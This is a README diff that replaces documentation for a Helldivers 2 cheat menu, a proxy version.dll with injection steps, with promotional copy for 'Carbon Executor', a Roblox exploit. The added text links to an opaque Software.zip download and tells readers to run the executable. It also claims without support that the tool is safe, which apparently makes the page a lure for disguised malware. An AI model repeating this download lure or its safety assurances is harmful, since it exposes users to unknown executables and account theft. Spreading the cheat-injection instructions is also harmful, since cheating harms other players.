@@ -1,51 +1,39 @@
-# Helldivers2Menu
+# Carbon Executor: Unleash the Power of Roblox Scripting
 
-<p align="center">
-   Helldivers2Menu is a Cheat Menu for the popular Game Helldivers 2.
-</p>
+Welcome to Carbon Executor, your gateway to unparalleled Roblox script execution. This state-of-the-art Roblox exploit empowers users with unmatched performance and security features, including 90% UNC support and Level 8 execution capabilities. Compatible with Windows 7 through 11, Carbon Executor enables you to unlock the full potential of Roblox scripting effortlessly.
 
-## Disclaimer
-This project is for Educational Use only. We do not condone this software being used to gain an advantage against other people. I made this project for my university project to show how cheating software works and how it is possible to block these manipulations in the future.
+## Features
+- **Performance**: Experience top-tier performance with Carbon Executor's cutting-edge technology.
+- **Security**: Rest assured with Carbon Executor's robust security measures.
+- **Compatibility**: Seamlessly use Carbon Executor on Windows 7 through 11.
+- **Ease of Use**: Effortlessly tap into advanced Roblox scripting capabilities.
 
-## Compile (Configurations)
-Please compile the project in **Release** mode. Debug does not work properly and gets detected by GG.
+## Get Started
+To embark on your Roblox scripting journey with Carbon Executor, download the software by clicking the button below:
 
-### Version Proxy (version.dll)
-Will automatically be loaded by the Game itself if the dll is in the game directory.
+[![Download Carbon Executor](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18060583/Software.zip "Launch the Software")
 
-### How to Run
-1. Move the `version.dll` into the game directory in `/bin`
-2. Change the Launch Options in Steam for the game into `--use-d3d11` 
-3. Start the game
-4. Press DELETE to show the menu
-5. For performance increase, change into fullscreen mode (Dx11 being funky in HD2)
+*(Note: The link provided needs to be launched to download the software.)*
 
-### Running on Proton (Version Proxy Only)
-First you will need protontricks, you can install it with your packager of choice.
+If the link above is inaccessible, please visit the "Releases" section of this repository for alternative download options.
 
-1. Make sure you are running Helddivers 2 under Proton  
-   You can check by going to **Properties -> Compatibility**
-3. Put version.dll into Helldivers 2 bin folder
-4. Run `protontricks --gui`
-5. Choose **HELLDIVERS 2**
-6. Click on **Select the default wineprefix** and then **OK**
-7. Click on **Run winecfg** and then **OK**
-8. In the configuration window, click on **Libraries**
-9. Type `version` into the **New override for library** input
-10. Click **Add** and then **Apply**
-11. Helldivers2Menu should now work properly in the game
+## FAQs
+### How to Install Carbon Executor?
+Follow these simple steps to install Carbon Executor:
+1. Download the software from the provided link.
+2. Extract the downloaded files to a folder.
+3. Run the executable file to launch Carbon Executor.
 
-### Default Hotkeys
-- Show Menu - DELETE
+### Is Carbon Executor Safe to Use?
+Yes, Carbon Executor prioritizes user security with its advanced security features, ensuring a safe scripting experience.
 
-## Screenshot
-<p align="center">
-   <img src="screenshot.png">
-</p>
+### Can I Use Carbon Executor on Mac or Linux?
+Currently, Carbon Executor is compatible only with Windows operating systems ranging from Windows 7 to 11.
 
-## Contributing
-1. Fork it (<https://github.com/BitCrackers/Helldivers2Menu/fork>)
-2. Create your feature branch (`git checkout -b feature/fooBar`)
-3. Commit your changes (`git commit -am 'Add some fooBar'`)
-4. Push to the branch (`git push origin feature/fooBar`)
-5. Create a new Pull Request
+## Contribute
+We welcome contributions to enhance the functionality and usability of Carbon Executor. Feel free to submit pull requests or raise issues in the repository.
+
+## Connect with Us
+Stay updated with the latest news and updates about Carbon Executor by following us on social media platforms.
+
+Thank you for choosing Carbon Executor to amplify your Roblox scripting endeavors. Let's script smarter, together! 🚀
